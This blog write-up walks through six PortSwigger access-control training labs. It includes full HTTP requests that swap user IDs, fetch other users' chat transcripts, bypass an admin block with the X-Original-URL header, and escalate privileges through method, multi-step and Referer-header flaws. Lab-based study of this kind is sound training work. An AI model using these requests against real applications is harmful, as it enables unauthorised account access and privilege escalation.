---
title: Portswigger BAC Labs 2
date: 2026-10-15
categories:
  - - Writeups
tags:
  - Web
  - Portswigger
cover: /images/rezebw.jpg
---

Tackling the Access Control Labs from Portswigger

<!-- more -->

---
## Lab: User ID controlled by request parameter with password disclosure

### Description

>This lab has user account page that contains the current user's existing password, prefilled in a masked input.
>To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

We have our test creds `wiener:peter` so we login normally and access our account page:

![](images/login.png)

Our Current password is exposed(masked) on the account page . Inspecting the request that got us this page:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a58002303da3040802b58ec00f2004b.web-security-academy.net
Cookie: session=ACgE5MsiNZHO1BDdmGaqciYDuMA7tJg2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

We can try and switch the id to our target account and see what we'll get:

```http
GET /my-account?id=administrator HTTP/2
Host: 0a58002303da3040802b58ec00f2004b.web-security-academy.net
Cookie: session=ACgE5MsiNZHO1BDdmGaqciYDuMA7tJg2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

Response:

![](images/administrator.png)

Inspect the code(switch from render to pretty) and search for password:

![](images/pass.png)

Login as administrator with the newly acquired creds and delete the user `carlos` to solve the lab:

![](images/pass_disclosure.png)

## Lab: Insecure direct object references

### Description

>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.
>Solve the lab by finding the password for the user `carlos`, and logging into their account.

### Solve

Looking through the app after logging in , we notice a live chat functionality that allows us to communicate with someone else . Along with it , is a functionality that allows us to `view transcript` which, in this case, let us download the transcript.

#### Vulnerable Component

I used live chat and afterwards downloaded the transcript , capturing all the traffic with burp.

Looking at the response to our `view transcript` request , i notice its a 302 redirect to a resource at `/download-transcript/3.txt`:

![](images/req_res.png)

Visiting the resource url in the browser and changing the destination from `3.txt` to `1.txt` , downloads a file named `1.txt` which contains among other things , a password in plain text `pu2fcwk8dgsesqrvgicx` . Presumably carlos password.

This a classic case of IDOR where the site fails to check if a user is allowed to access a certain resource or has sufficient privileges to do so.

![](images/carlos_idor_pass.png)

## Lab: URL-based access control can be circumvented

### Description

>This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.
>To solve the lab, access the admin panel and delete the user `carlos`.

### Solve

We have no creds. We visit the admin panel and are greeted by the error `Access Denied` . Trying to bypass this 403 :

> X-original-url : is used by reverse proxies (such as Nginx, Apache, or load balancers) to preserve the original requested URL before internal rewriting or redirection. It helps backend applications determine the original request when URL rewriting is in use.

Here is the bypass:

```http
GET / HTTP/2
Host: 0a48001b03d3d4488328f614009c009b.web-security-academy.net
X-Original-Url: /admin
Cookie: session=yLeL21qsgl8g4nk9eVVu0K9rspZtDXD3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

How it works -> Since the backend supports `X-Original-url` , this allows us to add the restricted resource as a value to the header. The backend processes it as the originally requested URL.

Now to delete the user carlos:

```http
GET /?username=carlos HTTP/2
Host: 0a48001b03d3d4488328f614009c009b.web-security-academy.net
X-Original-Url: /admin/delete
Cookie: session=yLeL21qsgl8g4nk9eVVu0K9rspZtDXD3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8


```

![](images/url_based.png)

## Lab: Method-based access control can be circumvented

### Description

>This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
>To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator

### Solve

We are provided with admin creds so we can explore what admin functionalities exist.

We have an admin panel at `/admin` where we can upgrade/downgrade users privileges:

![](images/upgrade.png)

Inspecting what an upgrade request looks like:

```http
POST /admin-roles HTTP/2
Host: 0a55006303fb73a5811e489f009c006c.web-security-academy.net
Cookie: session=LNVgYeqh5pd6T0Iu6ML7eoj8y6fo3EU0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

username=carlos&action=upgrade
```

A `POST` request to `/admin-roles` with username and action fields in the body.

Now we login with our test account `wiener` and try to elevate our privileges by sending a `POST` to `/admin-roles`:

![](images/POST_admin_roles.png)

We are `Unauthorised` .

Trying to access `/admin-roles` on the browser , we see:

![](images/Missing_username.png)

Capture this request in burp and add `username` and `action`:

![](images/Get_admin_roles.png)

Check our account and we are admin:

![](images/method_circumvent.png)

## Lab: Multi-step process with no access control on one step 

### Description

>This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
>To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

### Solve

We login as `administrator:admin` and inspect the flow of upgrading/downgrading a user:

First request:

```http
POST /admin-roles HTTP/2
Host: 0aa7009403be789880b4a3e700560014.web-security-academy.net
Cookie: session=oqI9Jd1vrrjFztBLzzP17JS75ESWjU8h
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0aa7009403be789880b4a3e700560014.web-security-academy.net
Referer: https://0aa7009403be789880b4a3e700560014.web-security-academy.net/admin

username=carlos&action=upgrade
```

Second Request for confirmation:

```http
POST /admin-roles HTTP/2
Host: 0aa7009403be789880b4a3e700560014.web-security-academy.net
Cookie: session=oqI9Jd1vrrjFztBLzzP17JS75ESWjU8h
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0aa7009403be789880b4a3e700560014.web-security-academy.net
Referer: https://0aa7009403be789880b4a3e700560014.web-security-academy.net/admin-roles

action=upgrade&confirmed=true&username=carlos
```

Now we can login with our test credentials and try to send both of these requests:

Sending the first request , returns a `401 unauthorised`:

![](images/first_req.png)

Trying to add the `confirmed=true` field thats present in the second admin request to our above request:

![](images/second_req.png)

We are now admin ; Seems there was no check / adding confrimed bypassed the checks:

![](images/lab_solve.png)

## Lab: Referer-based access control

### Description

>This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
>To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

### Solve

We login as admin since we have the creds and map out the flow of the privileges escalation:

The request:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0aaa001603014d5080bd58cd002500db.web-security-academy.net
Cookie: session=f0SKZTvNjIrFcspzPXpzdBo8iGPzkT7B
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa001603014d5080bd58cd002500db.web-security-academy.net/admin

```


There is only one request in the steps . So we can login using our test credentials and try to upgrade our privileges :

![](images/Unauth.png)

We are unauthorized . Trying to bypass using the referrer header. This header shows where the user was before accessing this link/page. So which page might show that we 'were' admin. Of course its `/admin`

![](images/no_refferer.png)

And there we are admin:

![](images/referrer.png)

